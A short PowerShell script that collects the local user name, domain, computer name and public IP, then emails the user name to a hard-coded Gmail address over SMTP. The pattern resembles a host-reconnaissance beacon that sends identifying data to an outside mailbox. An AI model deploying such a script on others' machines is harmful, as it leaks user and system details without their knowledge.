#Get Information
$user=$env:UserName
$domain=$env:UserDomain
$computer=$env:ComputerName
$ip=Invoke-RestMethod http://ipinfo.io/json
 
#Email Section
$from = "somoyyt@gmail.com"
$smtp = "smtp.gmail.com"
$to = "somoyyt@gmail.com" 
$body = "aloha"
$Creds = (Get-Credential -Credential "$from")
    
#Send Email
send-MailMessage -SmtpServer $smtp -Port 587 -Credential $Creds -To $to -From $from -Subject $user -Body $body -BodyAsHtml -Priority high -UseSsl
